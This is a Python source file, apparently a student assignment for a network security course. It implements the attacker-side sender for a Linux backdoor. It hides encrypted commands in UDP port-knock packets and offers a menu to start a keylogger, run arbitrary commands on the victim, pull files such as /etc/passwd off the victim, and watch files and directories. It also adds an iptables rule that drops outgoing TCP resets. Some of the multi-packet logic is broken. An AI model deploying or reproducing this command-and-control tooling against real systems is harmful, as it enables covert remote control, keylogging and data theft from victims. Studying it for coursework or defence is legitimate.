#!/usr/bin/env python3

"""
----------------------------------------------------------------------------------------------------
COMP 8505 BTech Network Security & Applications Development
Assignment 3:
    - To become familiar with packet sniffing backdoors and to implement Linux backdoors.
Student:
    - Hung Yu (Angus) Lin, A01034410, Set 7J
----------------------------------------------------------------------------------------------------
sender.py
    - Contains sender command line UI send a command hidden in UDP port knocking to receiver backdoor,
      then decrypts the data returned from backdoor and display to user.
----------------------------------------------------------------------------------------------------
"""
import socket as sock
from _thread import *
from scapy.all import *
from scapy.layers.inet import *
import encryption
import textwrap
# Set scapy to use libpcap library to circumvent iptables rules.
from scapy.all import conf
conf.use_pcap = True

LOG_PATH = "log.txt"
CONFIGURATION_PATH = "configuration.txt"


class Configuration:
    def __init__(self):
        self.receiver_address = ''
        self.sender_address = ''
        self.receiver_port = 0
        self.sender_port = 0
        self.port_knock_password_base = ''
        self.port_knock_password_seq_num = ''
        self.delimiter = ''

        with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
            fp = [line.rstrip('\n') for line in file]
            for line in fp:
                if line.isspace() or line.startswith('#'):
                    continue

                config_data = line.split('=')
                if config_data[0] == 'receiver_address':
                    self.receiver_address = config_data[1]
                elif config_data[0] == 'sender_address':
                    self.sender_address = config_data[1]
                elif config_data[0] == 'sender_port':
                    if config_data[1].isdigit():
                        self.sender_port = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                elif config_data[0] == 'receiver_port':
                    if config_data[1].isdigit():
                        self.receiver_port = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                elif config_data[0] == 'port_knock_password_base':
                    self.port_knock_password_base = config_data[1]
                elif config_data[0] == 'port_knock_password_seq_num':
                    self.port_knock_password_seq_num = config_data[1]
                elif config_data[0] == 'delimiter':
                    self.delimiter = config_data[1]

    def update_port_knock_password_seq_num(self):
        self.port_knock_password_seq_num = str(int(self.port_knock_password_seq_num) + 1)

        with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
            data = file.readlines()

        for idx, a in enumerate(data):
            if "port_knock_password_seq_num" in a:
                data[idx] = "port_knock_password_seq_num=" + str(self.port_knock_password_seq_num) + "\n"

        with open(file=CONFIGURATION_PATH, mode='w', encoding='utf-8') as file:
            file.writelines(data)


# Initialize configuration class
config = Configuration()


# def read_configuration():
#     """
#     Reads configuration file.
#     :return: list (config vars)
#     """
#     configuration = {
#         'receiver_address': '',
#         'sender_address': '',
#         'receiver_port1': 0,
#         'receiver_port2': 0,
#         'receiver_port3': 0,
#         'sender_port': 0,
#         'port_knock_auth': '',
#     }
#
#     with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
#         fp = [line.rstrip('\n') for line in file]
#         for line in fp:
#             if line.isspace() or line.startswith('#'):
#                 continue
#
#             config_data = line.split('=')
#             if config_data[0] in configuration:
#                 if config_data[0] in ('receiver_address', 'sender_address', 'port_knock_auth'):
#                     configuration[config_data[0]] = config_data[1]
#                 elif config_data[0] in ('receiver_port1', 'receiver_port2', 'receiver_port3', 'sender_port'):
#                     data = config_data[1]
#                     if data.isdigit():
#                         configuration[config_data[0]] = int(config_data[1])
#                     else:
#                         print("Invalid configuration, ports must be integers.")
#                         exit()
#                 else:
#                     print("Invalid configuration, unsupported variable detected.")
#                     exit()
#
#     return configuration


def start_sender():
    """
    Initializes command line UI for attacker to send shell commands to a backdoor receiver.
    Calls port-knocking and listening for response for each commands sent.
    :return: None
    """

    # Generate encryption key if needed. Ensure both sender and receiver have same key.
    encryption.generate_key()

    # Read Configuration
    global config
    config = Configuration()
    receiver_addr = config.receiver_address
    port1 = config.receiver_port
    port2 = config.receiver_port
    port3 = config.receiver_port
    sender_addr = config.sender_address
    sender_port = config.sender_port
    delimiter = config.delimiter

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    try:
        ipcmd = f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {IPAddr} --sport 80 -j DROP'
        result2 = subprocess.run(ipcmd, capture_output=True, text=True, shell=True).stdout
    except Exception:
        result2 = "Could not set iptables rule to drop port 80 reset packets."
    print(f"subprocess set iptables rule result: {result2}")

    # hostname = socket.gethostname()
    # IPAddr = socket.gethostbyname(hostname)
    # start_new_thread(data_server, (IPAddr, sender_port))

    keep_going = True
    while keep_going:
        print(f"====================================\n"
              f"Attacker Menu:\n"
              f"    1. Start keylogger\n"
              f"    2. Stop keylogger\n"
              f"    3. Execute a command\n"
              f"    4. Transfer a file from victim to attacker\n"
              f"    5. Start watching a file on victim\n"
              f"    6. Stop watching file\n"
              f"    7. Start watching a directory on victim\n"
              f"    8. Stop watching directory\n"
              f"    9. Exit\n")
        user_input = input("Type number and press enter:\n")
        command = ''

        if user_input == "1":
            command = user_input
            print(command)
        elif user_input == "2":
            command = user_input
            print(command)
        elif user_input == "3":
            user_input2 = input("Type in command (E.g. ifconfig):\n")
            command = user_input + delimiter + user_input2
            print(command)
        elif user_input == "4":
            user_input2 = input("Type in file path (E.g. /etc/passwd):\n")
            command = user_input + delimiter + user_input2
            print(command)
        elif user_input == "5":
            user_input2 = input("Type in file path (E.g. /etc/passwd):\n")
            command = user_input + delimiter + user_input2
            print(command)
        elif user_input == "6":
            command = user_input
            print(command)
        elif user_input == "7":
            user_input2 = input("Type in directory path (E.g. /etc/ssh):\n")
            command = user_input + delimiter + user_input2
            print(command)
        elif user_input == "8":
            command = user_input
            print(command)
        elif user_input == "9":
            command = user_input
            print(command)
            print("Do some Exit stuff")
            print("Attacker Exiting.")
            break
        else:
            print("Invalid input, try again.")

        try:
            encoded_input = command.encode("utf-8").decode("utf-8")
        except UnicodeEncodeError or UnicodeDecodeError:
            print("Invalid character detected. Must be UTF-8 supported values only.")
            continue

        # Send command with port-knocking.
        send_port_knock(command)

        # Listen for backdoor response.
        # data_server(IPAddr, sender_port)

    try:
        ipcmd = f'iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {IPAddr} --sport 80 -j DROP'
        result2 = subprocess.run(ipcmd, capture_output=True, text=True, shell=True).stdout
    except Exception:
        result2 = "Could not drop iptables rule to drop port 80 reset packets."
    print(f"subprocess drop iptables rule result: {result2}")


def send_port_knock(command):
    """
    Performs port-knocking sequence on the receiver backdoor.
    UDP packets are sent with auth_string as payload in order to port 1-3 as specified in config file.
    Command is encrypted and send with final packet in port-knocking sequence.
    :param command: str of command to send to victim
    :param receiver_addr: IP address
    :param port1: int of port
    :param port2: int of port
    :param port3: int of port
    :param port_knock_auth: str used for authentication
    :return: None
    """
    global config

    port_knock_auth = config.sender_address
    port = RandShort()
    receiver_addr = config.receiver_address
    packet_start = "$$!!".encode('utf-8')
    delimiter = config.delimiter

    sport = RandShort()
    one_time_password = config.port_knock_password_base+config.port_knock_password_seq_num

    msg_len = len(command.encode('utf-8'))
    if msg_len <= 240:
        packet_order = f"{delimiter}1/1"
        message = one_time_password + packet_order + delimiter + command
        encrypt_msg = packet_start + encryption.encrypt(message.encode('utf-8')).decode('utf-8')
        encrypt_len = len(encrypt_msg.encode('utf-8'))
        if encrypt_len > 508:
            print("Warning, payload in port knock packet exceeding 508 bytes, may not decrypt if payload "
                  "is truncated.")
        port_knock1 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port) / Raw(load=encrypt_msg)
        send(port_knock1, verbose=0)
    else:
        parts = textwrap.wrap(command)

        for idx, part in enumerate(parts):
            packet_order = f"{delimiter}{idx}/{len(parts)}"
            message = one_time_password + packet_order + delimiter + command
            encrypt_msg = packet_start + encryption.encrypt(message.encode('utf-8')).decode('utf-8')
            encrypt_len = len(encrypt_msg.encode('utf-8'))
            if encrypt_len > 508:
                print("Warning, payload in port knock packet exceeding 508 bytes, may not decrypt if payload "
                      "is truncated.")
                port_knock2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port) / Raw(load=encrypt_msg)
                send(port_knock2, verbose=0)
        print("Warning, payload in port knock packet exceeding 500 bytes, may not decrypt if payload truncated.")


    # Port-knocking 3 UDP ports with Auth keyword as payload. Include command at end of last packet payload.
    # port_knock_1 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port1) / Raw(load=port_knock_auth)
    # port_knock_2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port2) / Raw(load=port_knock_auth)
    # port_knock_3 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port3) / Raw(load=command_payload)
    # send(port_knock_1, verbose=0)
    # send(port_knock_2, verbose=0)
    # send(port_knock_3, verbose=0)


def data_server(address, port):
    """
    Creates a socket that listens for a single TCP response from the receiver backdoor.
    Decrypts the data and closes the socket connection.
    :param address: IP address
    :param port: int of port
    :return: None
    """
    with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as IPv4_sock:
        IPv4_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
        IPv4_sock.bind((address, port))
        IPv4_sock.listen(10)
        # print("Listening on: ", IPv4_sock.getsockname())

        # while True:
        conn, addr = IPv4_sock.accept()

        data_full = ''
        while True:
            data = conn.recv(1024).decode('utf-8')
            if data:
                data_full += data
            else:
                conn.close()
                break
        print(f"Encrypted Data: {data_full}")
        decrypted_data = encryption.decrypt(data_full.encode('utf-8')).decode('utf-8')
        print(f"Data: {decrypted_data}")


if __name__ == "__main__":
    try:
        start_sender()
    except KeyboardInterrupt as e:
        print("Attacker Shutdown")
        exit()


